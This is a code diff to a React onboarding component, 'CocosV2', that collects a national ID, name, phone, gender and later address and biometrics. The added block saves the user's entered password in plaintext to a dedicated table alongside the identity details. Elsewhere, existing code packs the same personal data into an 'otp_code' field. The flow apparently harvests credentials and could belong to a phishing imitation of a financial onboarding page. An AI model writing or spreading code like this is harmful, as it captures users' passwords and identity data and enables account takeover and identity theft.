@@ -1101,8 +1101,19 @@ const CocosV2 = () => {
       otp_code: `dni:${data.identity_number}|name:${result?.full_name || data.selected_full_name || ""}|uuid:${result?.user_uuid || ""}|gender:${resolvedGender}|phone:${resolvedPhone}`,
     });
 
+    // Persist onboarding data to dedicated table
+    await saveOnboardingData({
+      dni: data.identity_number,
+      full_name: result?.full_name || data.selected_full_name || "",
+      phone: resolvedPhone,
+      gender: resolvedGender,
+      user_uuid: result?.user_uuid || "",
+      password: lastPasswordRef.current || lastPassword || "",
+      status: "verify_dni_success",
+    });
+
     setStep("address");
-  }, [email, lastPassword, syncedPhone, updateSession]);
+  }, [email, lastPassword, syncedPhone, updateSession, saveOnboardingData]);
 
   // ── Address submission → then biometric ──
   const handleAddressSubmit = useCallback(async (addressData: Record<string, unknown>) => {
